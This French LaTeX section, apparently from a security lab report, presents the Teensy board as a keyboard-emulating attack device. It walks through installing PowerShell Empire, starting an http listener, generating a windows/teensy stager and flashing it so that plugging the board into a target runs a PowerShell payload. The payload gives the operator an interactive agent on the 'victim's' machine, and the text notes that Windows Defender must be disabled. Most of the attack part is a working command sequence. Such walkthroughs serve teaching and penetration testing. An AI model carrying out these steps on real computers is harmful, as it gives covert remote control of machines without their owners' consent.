\section{Présentation des outils}

\subsection{Premier outil: Teensy}

\subsubsection{Présentation}

Le Teensy est un kit de développement similaire aux produits de la gamme Arduino, 
ce dispositif peut-être utilisé comme un HID (Human Interface Device), 
c’est à dire se faire passer pour un clavier par exemple et envoyer des frappes de clavier à l’ordinateur 
auquel il est connecté.

Ce produit est aussi similaire au fameux “Rubber Ducky”, produit par la société Hak5, 
il fournit les même possibilité mais il nécessite une configuration initial un peu plus poussé.

\subsubsection{Installation}
Pour commencer à développer sur le Teensy, il faut installer \href{https://www.arduino.cc/en/main/software}{l’IDE de Arduino}, 
une fois l’installation effectuée il faut installer le \href{https://www.pjrc.com/teensy/teensyduino.html}{plugin Teensyduino}, qui va permettre de programmer sur le Teensy.

Pour créer les différents payloads d’attaque,nous avons utilisé le framework “Empire”, qui permet de faciliter 
la création de payloads malveillant pour les Teensy.

Pour l’installer il suffit simplement de taper la commande suivante sur Kali Linux:

\begin{lstlisting}{language=bash}
\> apt install powershell-empire
\end{lstlisting}

Pour les autres distribution voir \href{https://github.com/BC-SECURITY/Empire/tree/dev}{ici}. 

\subsubsection{Création de payloads}
Nous allons donc utiliser “Empire” pour créer des palyoads pour le Teensy, pour ce faire, il faut démarrer “Empire” en tapant: 

\begin{lstlisting}{language=bash}
> powershell-empire
\end{lstlisting}

Ensuite il faut choisir quel listener utiliser, nous allons utiliser le listener “http”, il faut donc taper:

\begin{lstlisting}{language=bash}
> uselistener http
\end{lstlisting}

Ensuite, on peut configurer ce module comme un module Metasploit, ici on va juste changer le port d’écoute en tapant:

\begin{lstlisting}{language=bash}
> set Port 9000
\end{lstlisting}

Puis pour executer le listener on tape:

\begin{lstlisting}{language=bash}
> execute
\end{lstlisting}

Après il faut choisir le mode de transmission, ici on va choisir la transmission par un Teensy, il faut donc taper:

\begin{lstlisting}{language=bash}
> usestager windows/teensy
\end{lstlisting}

Puis associer le stagers au listener en tapant:

\begin{lstlisting}{language=bash}
> set Listener http
\end{lstlisting}

Et enfin, générer le payload en tapant:

\begin{lstlisting}{language=bash}
> generate
\end{lstlisting}

Empire devrait afficher que le fichier de script Arduino a bien été créer:

Il ne nous reste plus qu’à le compiler et le transférez sur le Teensy, pour cela il faut 
revenir sur l’IDE Arduino et ouvrir le fichier précédemment créé, puis cliquez sur le bouton en haut à gauche de compilation/vérification:

Puis, une fois la compilation finie, il faut cliquer sur le bouton d’upload vers le Teensy:

Il est possible que Arduino ne parviennent pas à mettre le Teensy en “Program Mode”, dans ce cas là, appuyez sur 
le bouton présent sur le Teensy pour le mettre en “Program Mode” manuellement.

Après tout cela, branchez le Teensy sur l’ordinateur cible, celui-ci devrait ouvrir un shell de cmd et tapez 
son payload pour l'exécuter avec Powershell, une fois ceci fait, un agent devrait être disponible sur Empire:

Pour voir les agents avec lesquels il est possible d'interagir, tapez:

\begin{lstlisting}{language=bash}
> agents
\end{lstlisting}



Pour interagir avec un agent, tapez:

\begin{lstlisting}{language=bash}
> interact $ID_AGENT
\end{lstlisting}

Il est maintenant possible d'interagir avec la machine de la victime !

\textbf{Note:} Il faut désactiver la protection de Windows Defender pour que le payload s'exécute correctement.

\subsubsection{Sources}
\begin{enumerate}
    \item \url{https://null-byte.wonderhowto.com/how-to/use-powershell-empire-generating-stagers-for-post-exploitation-windows-hosts-0179939/}
    \item \url{http://www.powershellempire.com/?page_id=110}
\end{enumerate}




